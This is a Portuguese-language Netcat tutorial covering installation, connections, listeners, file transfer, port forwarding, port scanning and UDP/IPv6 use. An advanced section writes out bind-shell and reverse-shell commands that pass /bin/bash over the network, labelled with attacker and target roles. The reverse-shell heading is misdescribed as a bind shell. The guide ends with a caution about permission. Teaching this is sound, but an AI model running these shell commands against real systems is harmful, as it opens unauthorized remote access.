# Netcat

## Introdução

Netcat (ou `nc`) é uma ferramenta de rede versátil que permite ler e escrever dados através de conexões de rede usando os protocolos TCP ou UDP. Ele é conhecido como o "canivete suíço" das ferramentas de rede, sendo amplamente utilizado para depuração, transferência de arquivos, testes de rede, criação de portas de escuta (listeners), e muito mais. 

## Instalação

### Instalação no Linux

Em muitas distribuições Linux, Netcat já vem instalado por padrão. Caso não esteja, você pode instalá-lo usando:

- **Debian/Ubuntu**:
  ```bash
  sudo apt-get install netcat
  ```

- **CentOS/RHEL**:
  ```bash
  sudo yum install nc
  ```

### Instalação no macOS
No macOS, Netcat pode ser instalado usando o Homebrew:

```bash
brew install netcat
```

### Verificando a Instalação
Para verificar se Netcat está instalado corretamente, digite o comando:

```bash
nc -h
```

## Comandos Básicos do Netcat

### Criando uma Conexão TCP

#### Cliente TCP
Para iniciar uma conexão TCP com um servidor em uma porta específica, use:

```bash
nc <endereço IP ou hostname> <porta>
```

##### Exemplo
Conectando-se a um servidor na porta 80:

```bash
nc example.com 80
```

Para especificar a porta de origem do cliente utilize a opção `-p`:

```bash
nc -p 53 example.com 80
```
### Criando um Listener (Servidor TCP)

Netcat pode ser usado para criar um listener, que escuta por conexões em uma porta específica. Isso é útil para testar portas ou aceitar conexões.

#### Servidor TCP
```bash
nc -l -p <porta>
```

##### Exemplo
Criando um listener na porta 1234:

```bash
nc -l -p 1234
```

### Transferência de Arquivos

Netcat pode ser utilizado para transferir arquivos entre dois hosts.

#### Enviando Arquivo
No servidor que está enviando o arquivo:
```bash
nc <endereço IP do destinatário> <porta> < arquivo
```

##### Exemplo
Enviando o arquivo `example.txt` para um cliente que está ouvindo na porta 1234:

```bash
nc 192.168.1.10 1234 < example.txt
```

#### Recebendo Arquivo
No cliente que está recebendo o arquivo:
```bash
nc -l -p <porta> > arquivo
```

##### Exemplo
Recebendo o arquivo `example.txt` na porta 1234:

```bash
nc -l -p 1234 > example.txt
```

### Redirecionando uma Porta

Netcat também pode ser usado para redirecionar tráfego de uma porta para outra. Isso é útil para criar um proxy simples.

##### Exemplo de Redirecionamento
Redirecionando o tráfego da porta 1234 para a porta 80:

```bash
nc -l -p 1234 -c 'nc example.com 80'
```

### Verificando se uma Porta Está Aberta

Netcat pode ser usado para verificar se uma porta está aberta em um servidor específico.

##### Exemplo
Verificando se a porta 80 está aberta no servidor `example.com`:

```bash
nc -zv example.com 80
```

- `-z`: Não envia dados, apenas verifica se a porta está aberta.
- `-v`: Habilita a saída detalhada.

### Chat Simples com Netcat

Netcat pode ser usado para criar um chat simples entre duas máquinas.

#### Exemplo

- **No servidor** (listener):
  ```bash
  nc -l -p 1234
  ```

- **No cliente** (conectando ao servidor):
  ```bash
  nc <endereço IP do servidor> 1234
  ```

Agora, qualquer texto digitado por uma das partes será enviado e exibido na outra máquina.

### Escaneamento de Portas com Netcat

Netcat também pode ser utilizado para fazer varreduras de portas em um servidor.

#### Exemplo
Escaneando as portas de 1 a 1000 no servidor `example.com`:

```bash
nc -z example.com 1-1000
```

- `-z`: Verifica se a porta está aberta sem enviar dados.

## Funções Avançadas do Netcat

### Executando Comandos Remotamente com Bind Shell

Netcat pode ser utilizado para executar comandos em uma máquina remota, criando uma simples "bind shell".

#### Shell Remota (Servidor do Alvo)
```bash
nc -l -p 1234 -e /bin/bash
```

#### Conectando à Bind Shell (Cliente do Atacante)
```bash
nc <endereço IP do servidor> 1234
```

### Executando Comandos Remotamente com Shell Reversa

Netcat pode ser utilizado para executar comandos em uma máquina remota, criando uma simples "bind shell".

#### Shell Remota (Servidor do Atacante)
```bash
nc -l -p 1234
```

#### Conectando à Shell Reversa (Cliente do Alvo)

```bash
nc <endereço IP do servidor> 1234 -e /bin/bash
```

### Enviando Pacotes UDP

Netcat também pode ser utilizado para enviar pacotes UDP, em vez de TCP.

#### Exemplo
Enviando pacotes UDP para o servidor `example.com` na porta 1234:

```bash
nc -u example.com 1234
```

#### Criando um Listener UDP
```bash
nc -u -l -p 1234
```

### Usando Netcat com IPv6

Netcat também oferece suporte a IPv6. Para especificar o uso do protocolo IPv6, basta adicionar o parâmetro `-6`.

#### Exemplo
Conectando-se a um servidor via IPv6:

```bash
nc -6 <endereço IPv6> <porta>
```

## Segurança com Netcat

Embora Netcat seja uma ferramenta extremamente poderosa e versátil, é importante usá-lo com cautela, pois ele também pode ser utilizado para fins maliciosos, como criar backdoors em sistemas. Certifique-se de utilizar Netcat em um ambiente controlado e com permissão explícita.

